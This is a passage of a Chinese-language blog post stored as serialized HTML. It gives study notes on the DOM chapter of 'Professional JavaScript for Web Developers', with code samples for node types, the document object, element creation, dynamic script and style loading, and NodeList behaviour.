class=\"name\">label</span> <span class=\"attr\">for</span>=<span class=\"string\">\"colorBlue\"</span>&gt;</span>Blue<span class=\"tag\">&lt;/<span class=\"name\">label</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">ul</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">fieldset</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> radios = <span class=\"built_in\">document</span>.getElementsByName(<span class=\"string\">\"color\"</span>);</span><br></pre></td></tr></table></figure>\n<h4 id=\"特殊集合\"><a href=\"#特殊集合\" class=\"headerlink\" title=\"特殊集合\"></a>特殊集合</h4><p>除了属性和方法，document 对象还有一些特殊的集合。这些集合都是 HTMLCollection 对象，<br>为访问文档常用的部分提供了快捷方式，包括：</p>\n<ul>\n<li>document.anchors，包含文档中所有带 name 特性的<code>&lt;a&gt;</code>元素；</li>\n<li>document.applets，包含文档中所有的<code>&lt;applet&gt;</code>元素，因为不再推荐使用<code>&lt;applet&gt;</code>元素，所以这个集合已经不建议使用了；</li>\n<li>document.forms，包含文档中所有的<code>&lt;form&gt;</code>元素，与 document.getElementsByTagName(“form”)得到的结果相同；</li>\n<li>document.images，包含文档中所有的<code>&lt;img&gt;</code>元素，与 document.getElementsByTagName(“img”)得到的结果相同；</li>\n<li>document.links，包含文档中所有带 href 特性的<code>&lt;a&gt;</code>元素。</li>\n</ul>\n<h4 id=\"其他\"><a href=\"#其他\" class=\"headerlink\" title=\"其他\"></a>其他</h4><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">document</span>.implementation.hasFeature();</span><br><span class=\"line\"><span class=\"built_in\">document</span>.write();</span><br><span class=\"line\"><span class=\"built_in\">document</span>.writeln();</span><br><span class=\"line\"><span class=\"built_in\">document</span>.open();</span><br><span class=\"line\"><span class=\"built_in\">document</span>.close();</span><br></pre></td></tr></table></figure>\n<h3 id=\"Element-类型\"><a href=\"#Element-类型\" class=\"headerlink\" title=\"Element 类型\"></a>Element 类型</h3><p>Element 类型用于表现 XML 或 HTML 元素，提供了对元素标签名、子节点及特性的访问。Element 节点具有以下特征：</p>\n<ul>\n<li>nodeType 的值为 1；</li>\n<li>nodeName 的值为元素的标签名；</li>\n<li>nodeValue 的值为 null；</li>\n<li>parentNode 可能是 Document 或 Element；</li>\n<li>其子节点可能是 Element、Text、Comment、ProcessingInstruction、CDATASection 或 EntityReference。<br>要访问元素的标签名，可以使用 nodeName 属性，也可以使用 tagName 属性。</li>\n</ul>\n<p>对于标签名，HTML 中始终返回全大写，XML 中返回与源代码中一致，因此，实践中通常直接用 toLowerCase()转换后比较。如下：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// &lt;div id=\"myDiv\"&gt;&lt;/div&gt;</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> div = <span class=\"built_in\">document</span>.getElementById(<span class=\"string\">\"myDiv\"</span>);</span><br><span class=\"line\">alert(div.tagName); <span class=\"comment\">//\"DIV\"</span></span><br><span class=\"line\">alert(div.tagName == div.nodeName); <span class=\"comment\">//true</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (element.tagName == <span class=\"string\">\"div\"</span>) &#123;</span><br><span class=\"line\">  <span class=\"comment\">//不能这样比较，很容易出错！</span></span><br><span class=\"line\">  <span class=\"comment\">//在此执行某些操作</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">if</span> (element.tagName.toLowerCase() == <span class=\"string\">\"div\"</span>) &#123;</span><br><span class=\"line\">  <span class=\"comment\">//这样最好（适用于任何文档）</span></span><br><span class=\"line\">  <span class=\"comment\">//在此执行某些操作</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"HTML-元素\"><a href=\"#HTML-元素\" class=\"headerlink\" title=\"HTML 元素\"></a>HTML 元素</h4><p>对应的对象共有的读写属性有：<code>id,title,className,lang,dir</code></p>\n<h4 id=\"操作特性\"><a href=\"#操作特性\" class=\"headerlink\" title=\"操作特性\"></a>操作特性</h4><p>getAttribute()、setAttribute()、removeAttribute()、setAttribute()</p>\n<p>特性名称不区分大小写，自定义特性加 data-前缀。</p>\n<p>实践中，操作特性，常用对象的属性（div.id），只有自定义特性才用 getAttribute()、setAttribute()。</p>\n<h4 id=\"attributes-属性\"><a href=\"#attributes-属性\" class=\"headerlink\" title=\"attributes 属性\"></a>attributes 属性</h4><p>一般只在遍历元素的属性时使用，例如：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">outputAttributes</span>(<span class=\"params\">element</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> pairs = <span class=\"keyword\">new</span> <span class=\"built_in\">Array</span>(),</span><br><span class=\"line\">    attrName,</span><br><span class=\"line\">    attrValue,</span><br><span class=\"line\">    i,</span><br><span class=\"line\">    len;</span><br><span class=\"line\">  <span class=\"keyword\">for</span> (i = <span class=\"number\">0</span>, len = element.attributes.length; i &lt; len; i++) &#123;</span><br><span class=\"line\">    attrName = element.attributes[i].nodeName;</span><br><span class=\"line\">    attrValue = element.attributes[i].nodeValue;</span><br><span class=\"line\">    pairs.push(attrName + <span class=\"string\">'=\"'</span> + attrValue + <span class=\"string\">'\"'</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> pairs.join(<span class=\"string\">\" \"</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"创建元素\"><a href=\"#创建元素\" class=\"headerlink\" title=\"创建元素\"></a>创建元素</h4><p>document.createElement()，一个参数，要创建元素的标签名。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> div = <span class=\"built_in\">document</span>.createElement(<span class=\"string\">\"div\"</span>);</span><br></pre></td></tr></table></figure>\n<h4 id=\"元素的子节点\"><a href=\"#元素的子节点\" class=\"headerlink\" title=\"元素的子节点\"></a>元素的子节点</h4><p>大部分浏览器中，空格、换行都会作为元素的子节点，因此实践中会先检查 nodeType 属性，如下：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> i = <span class=\"number\">0</span>, len = element.childNodes.length; i &lt; len; i++) &#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (element.childNodes[i].nodeType == <span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">    <span class=\"comment\">//执行某些操作</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"Text-类型\"><a href=\"#Text-类型\" class=\"headerlink\" title=\"Text 类型\"></a>Text 类型</h3><p>文本节点由 Text 类型表示，包含的是可以照字面解释的纯文本内容。纯文本中可以包含转义后的 HTML 字符，但不能包含 HTML 代码。Text 节点具有以下特征：</p>\n<ul>\n<li>nodeType 的值为 3；</li>\n<li>nodeName 的值为”#text”；</li>\n<li>nodeValue 的值为节点所包含的文本；</li>\n<li>parentNode 是一个 Element；</li>\n<li>不支持（没有）子节点。</li>\n</ul>\n<p>可以通过 nodeValue 属性或 data 属性访问 Text 节点中包含的文本，这两个属性中包含的值相同。对 nodeValue 的修改也会通过 data 反映出来，反之亦然。使用下列方法可以操作节点中的文本。</p>\n<ul>\n<li>appendData(text)：将 text 添加到节点的末尾。</li>\n<li>deleteData(offset, count)：从 offset 指定的位置开始删除 count 个字符。</li>\n<li>insertData(offset, text)：在 offset 指定的位置插入 text。</li>\n<li>replaceData(offset, count, text)：用 text 替换从 offset 指定的位置开始到 offset+count 为止处的文本。</li>\n<li>splitText(offset)：从 offset 指定的位置将当前文本节点分成两个文本节点。</li>\n<li>substringData(offset, count)：提取从 offset 指定的位置开始到 offset+count 为止处的字符串。</li>\n</ul>\n<p>length 属性，保存着节点中字符的数目。</p>\n<h4 id=\"创建文本节点\"><a href=\"#创建文本节点\" class=\"headerlink\" title=\"创建文本节点\"></a>创建文本节点</h4><p>document.createTextNode()，一个参数，要插入节点中的文本。</p>\n<h4 id=\"规范化文本节点\"><a href=\"#规范化文本节点\" class=\"headerlink\" title=\"规范化文本节点\"></a>规范化文本节点</h4><p>normalize()，在父元素上调用该方法，会把所有文本节点合并成一个节点。</p>\n<h4 id=\"分割文本节点\"><a href=\"#分割文本节点\" class=\"headerlink\" title=\"分割文本节点\"></a>分割文本节点</h4><p>splitText()，一个参数，指定位置分割文本节点。原来的文本节点将包含从开始到指定位置之前的内容，新文本节点将包含剩下的文本。</p>\n<h3 id=\"其他类型\"><a href=\"#其他类型\" class=\"headerlink\" title=\"其他类型\"></a>其他类型</h3><p>了解 Comment 类型，CDATASection 类型，DocumentType 类型，DocumentFragment 类型，Attr 类型。重点关注下 DocumentFragment 类型，是一种“轻量级”的文档，对于节点在文档与文档片段间的添加，若存在则是移动而不是复制。实践中常作为“仓库”使用，可以避免浏览器反复渲染。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> fragment = <span class=\"built_in\">document</span>.createDocumentFragment();</span><br><span class=\"line\"><span class=\"keyword\">var</span> ul = <span class=\"built_in\">document</span>.getElementById(<span class=\"string\">\"myList\"</span>);</span><br><span class=\"line\"><span class=\"keyword\">var</span> li = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">3</span>; i++) &#123;</span><br><span class=\"line\">  li = <span class=\"built_in\">document</span>.createElement(<span class=\"string\">\"li\"</span>);</span><br><span class=\"line\">  li.appendChild(<span class=\"built_in\">document</span>.createTextNode(<span class=\"string\">\"Item \"</span> + (i + <span class=\"number\">1</span>)));</span><br><span class=\"line\">  fragment.appendChild(li);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">ul.appendChild(fragment);</span><br></pre></td></tr></table></figure>\n<h2 id=\"DOM-操作技术\"><a href=\"#DOM-操作技术\" class=\"headerlink\" title=\"DOM 操作技术\"></a>DOM 操作技术</h2><h3 id=\"动态脚本\"><a href=\"#动态脚本\" class=\"headerlink\" title=\"动态脚本\"></a>动态脚本</h3><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">loadScript</span>(<span class=\"params\">url</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> script = <span class=\"built_in\">document</span>.createElement(<span class=\"string\">\"script\"</span>);</span><br><span class=\"line\">  script.type = <span class=\"string\">\"text/javascript\"</span>;</span><br><span class=\"line\">  script.src = url;</span><br><span class=\"line\">  <span class=\"built_in\">document</span>.body.appendChild(script);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// loadScript(\"client.js\");</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">loadScriptString</span>(<span class=\"params\">code</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> script = <span class=\"built_in\">document</span>.createElement(<span class=\"string\">\"script\"</span>);</span><br><span class=\"line\">  script.type = <span class=\"string\">\"text/javascript\"</span>;</span><br><span class=\"line\">  <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">    script.appendChild(<span class=\"built_in\">document</span>.createTextNode(code));</span><br><span class=\"line\">  &#125; <span class=\"keyword\">catch</span> (ex) &#123;</span><br><span class=\"line\">    script.text = code;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"built_in\">document</span>.body.appendChild(script);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// loadScriptString(\"function sayHi()&#123;alert('hi');&#125;\");</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"动态样式\"><a href=\"#动态样式\" class=\"headerlink\" title=\"动态样式\"></a>动态样式</h3><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">loadStyles</span>(<span class=\"params\">url</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> link = <span class=\"built_in\">document</span>.createElement(<span class=\"string\">\"link\"</span>);</span><br><span class=\"line\">  link.rel = <span class=\"string\">\"stylesheet\"</span>;</span><br><span class=\"line\">  link.type = <span class=\"string\">\"text/css\"</span>;</span><br><span class=\"line\">  link.href = url;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> head = <span class=\"built_in\">document</span>.getElementsByTagName(<span class=\"string\">\"head\"</span>)[<span class=\"number\">0</span>];</span><br><span class=\"line\">  head.appendChild(link);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// loadStyles(\"styles.css\");</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">loadStyleString</span>(<span class=\"params\">css</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> style = <span class=\"built_in\">document</span>.createElement(<span class=\"string\">\"style\"</span>);</span><br><span class=\"line\">  style.type = <span class=\"string\">\"text/css\"</span>;</span><br><span class=\"line\">  <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">    style.appendChild(<span class=\"built_in\">document</span>.createTextNode(css));</span><br><span class=\"line\">  &#125; <span class=\"keyword\">catch</span> (ex) &#123;</span><br><span class=\"line\">    style.styleSheet.cssText = css;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> head = <span class=\"built_in\">document</span>.getElementsByTagName(<span class=\"string\">\"head\"</span>)[<span class=\"number\">0</span>];</span><br><span class=\"line\">  head.appendChild(style);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// loadStyleString(\"body&#123;background-color:red&#125;\");</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"操作表格\"><a href=\"#操作表格\" class=\"headerlink\" title=\"操作表格\"></a>操作表格</h3><p>可以用核心 DOM 方法也可以用 HTML DOM 为<code>&lt;table&gt;</code>、<code>&lt;tbody&gt;</code>和<code>&lt;tr&gt;</code>元素添加的属性和方法。由于实践中较少使用，这里不一一列举。</p>\n<h3 id=\"使用-NodeList\"><a href=\"#使用-NodeList\" class=\"headerlink\" title=\"使用 NodeList\"></a>使用 NodeList</h3><p>理解 NodeList 及其“近亲”NamedNodeMap 和 HTMLCollection，是从整体上透彻理解 DOM 的<br>关键所在。这三个集合都是“动态的”；换句话说，每当文档结构发生变化时，它们都会得到更新。因<br>此，它们始终都会保存着最新、最准确的信息。从本质上说，所有 NodeList 对象都是在访问 DOM 文<br>档时实时运行的查询。例如，下列代码会导致无限循环：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> divs = <span class=\"built_in\">document</span>.getElementsByTagName(<span class=\"string\">\"div\"</span>),</span><br><span class=\"line\">  i,</span><br><span class=\"line\">  div;</span><br><span class=\"line\"><span class=\"keyword\">for</span> (i = <span class=\"number\">0</span>; i &lt; divs.length; i++) &#123;</span><br><span class=\"line\">  div = <span class=\"built_in\">document</span>.createElement(<span class=\"string\">\"div\"</span>);</span><br><span class=\"line\">  <span class=\"built_in\">document</span>.body.appendChild(div);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 解决方法</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> divs = <span class=\"built_in\">document</span>.getElementsByTagName(<span class=\"string\">\"div\"</span>),</span><br><span class=\"line\">  i,</span><br><span class=\"line\">  len,</span><br><span class=\"line\">  div;</span><br><span class=\"line\"><span class=\"keyword\">for</span> (i = <span class=\"number\">0</span>, len = divs.length; i &lt; len; i++) &#123;</span><br><span class=\"line\">  div = <span class=\"built_in\">document</span>.createElement(<span class=\"string\">\"div\"</span>);</span><br><span class=\"line\">  <span class=\"built_in\">document</span>.body.appendChild(div);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>实践中，由于 NodeList 的操作开销很大，因此一般都是把 NodeList 取得的值缓存起来。</p>\n<h1 id=\"后记\"><a href=\"#后记\" class=\"headerlink\" title=\"后记\"></a>后记</h1>","site":{"data":{}},"excerpt":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>重读《JavaScript高级程序设计》，温故而知新。</p>\n<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>DOM（文档对象模型）是针对 HTML 和 XML 文档的一个 API（应用程序编程接口）。DOM 描绘了一个层次化的节点树，允许开发人员添加、移除和修改页面的某一部分。</p>","more":"<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><h2 id=\"节点层次\"><a href=\"#节点层次\" class=\"headerlink\" title=\"节点层次\"></a>节点层次</h2><p>HTML 与 DOM 树对应关系示例：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>Sample Page<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span>Hello World!<span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"/2019-01-28-JS高设3版-10/1.jpg\" alt=\"DOM树示例\"></p>\n<p>文档节点是每个文档的根节点。在这个例子中，文档节点只有一个子节点，即<html>元素，我们称之为<strong>文档元素</strong>。文档元素是文档的最外层元素，文档中的其他所有元素都包含在文档元素中。每个文档只能有一个文档元素。</html></p>\n<h3 id=\"Node-类型\"><a href=\"#Node-类型\" class=\"headerlink\" title=\"Node 类型\"></a>Node 类型</h3><p>DOM1 级定义了一个 Node 接口，该接口将由 DOM 中的所有节点类型实现。JavaScript 中通过 Node 类型来实现，作为基类，所有节点类型都继承自 Node 类型。</p>\n<p>nodeType 属性：表明节点的类型，由 12 个数值常量来表示。实践中，为了兼容，通常与数值比较，如下：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (someNode.nodeType == <span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">  <span class=\"comment\">//适用于所有浏览器</span></span><br><span class=\"line\">  alert(<span class=\"string\">\"Node is an element.\"</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>nodeName 和 nodeValue 属性：值取决于节点类型，因此实践中通常先检测类型再取值，如下：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (someNode.nodeType == <span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">  value = someNode.nodeName; <span class=\"comment\">//nodeName 的值是元素的标签名</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>childNodes 属性：保存着一个 NodeList 对象。NodeList 对象时一种类数组对象，基于 DOM 动态执行查询的结果，DOM 结构的变化能够自动反映在 NodeList 对象中。</p>\n<p>其他属性：parentNode，previousSibling，nextSibling，firstChild，lastChild，ownerDocument。</p>\n<p>hasChildNodes()方法：无参数，有节点时返回 true。</p>\n<p>appendChild()方法：一个参数，要添加的节点，如果该节点已经存在文档中，那么就是移动节点。</p>\n<p>insertBefore()方法：两个参数，要插入的节点和作为参照的节点。</p>\n<p>replaceChild()方法：两个参数，要插入的节点和要替换的节点。</p>\n<p>removeChild()方法：一个参数，要移除的节点。</p>\n<p>cloneNode()方法：一个布尔参数，表示是否深复制。</p>\n<p>normalize()方法：处理文本节点，后面章节再详述。</p>\n<h3 id=\"Document-类型\"><a href=\"#Document-类型\" class=\"headerlink\" title=\"Document 类型\"></a>Document 类型</h3><p>在浏览器中，document 对象是 HTMLDocument（继承自 Document 类型）的一个实例，表示整个 HTML 页面。而且，document 对象是 window 对象的一个属性，因此可以将其作为全局对象来访问。</p>\n<p>Document 节点具有下列特征：</p>\n<ul>\n<li>nodeType 的值为 9；</li>\n<li>nodeName 的值为”#document”；</li>\n<li>nodeValue 的值为 null；</li>\n<li>parentNode 的值为 null；</li>\n<li>ownerDocument 的值为 null；</li>\n<li>其子节点可能是一个 DocumentType（最多一个）、Element（最多一个）、ProcessingInstruction 或 Comment。</li>\n</ul>\n<h4 id=\"文档的子节点\"><a href=\"#文档的子节点\" class=\"headerlink\" title=\"文档的子节点\"></a>文档的子节点</h4><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> html = <span class=\"built_in\">document</span>.documentElement; <span class=\"comment\">//取得对&lt;html&gt;的引用</span></span><br><span class=\"line\">alert(html === <span class=\"built_in\">document</span>.childNodes[<span class=\"number\">0</span>]); <span class=\"comment\">//true</span></span><br><span class=\"line\">alert(html === <span class=\"built_in\">document</span>.firstChild); <span class=\"comment\">//true</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> body = <span class=\"built_in\">document</span>.body; <span class=\"comment\">//取得对&lt;body&gt;的引用</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"文档信息\"><a href=\"#文档信息\" class=\"headerlink\" title=\"文档信息\"></a>文档信息</h4><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//取得文档标题</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> originalTitle = <span class=\"built_in\">document</span>.title;</span><br><span class=\"line\"><span class=\"comment\">//设置文档标题</span></span><br><span class=\"line\"><span class=\"built_in\">document</span>.title = <span class=\"string\">\"New page title\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//取得完整的URL</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> url = <span class=\"built_in\">document</span>.URL;</span><br><span class=\"line\"><span class=\"comment\">//取得域名</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> domain = <span class=\"built_in\">document</span>.domain;</span><br><span class=\"line\"><span class=\"comment\">//取得来源页面的URL</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> referrer = <span class=\"built_in\">document</span>.referrer;</span><br></pre></td></tr></table></figure>\n<p>其中 domain 可设置，但是不能将这个属性设置为 URL 中不包含的域</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//假设页面来自p2p.wrox.com 域</span></span><br><span class=\"line\"><span class=\"built_in\">document</span>.domain = <span class=\"string\">\"wrox.com\"</span>; <span class=\"comment\">// 成功</span></span><br><span class=\"line\"><span class=\"built_in\">document</span>.domain = <span class=\"string\">\"nczonline.net\"</span>; <span class=\"comment\">// 出错！</span></span><br></pre></td></tr></table></figure>\n<p>还有一个限制，不能从松散到紧绷</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//假设页面来自于p2p.wrox.com 域</span></span><br><span class=\"line\"><span class=\"built_in\">document</span>.domain = <span class=\"string\">\"wrox.com\"</span>; <span class=\"comment\">//松散的（成功）</span></span><br><span class=\"line\"><span class=\"built_in\">document</span>.domain = <span class=\"string\">\"p2p.wrox.com\"</span>; <span class=\"comment\">//紧绷的（出错！）</span></span><br></pre></td></tr></table></figure>\n<p>实践中可以利用 domain 可设置来解决子域之间跨域问题</p>\n<h4 id=\"查找元素\"><a href=\"#查找元素\" class=\"headerlink\" title=\"查找元素\"></a>查找元素</h4><p>getElementById()，。这里的 ID 必须与页面中元素的 id 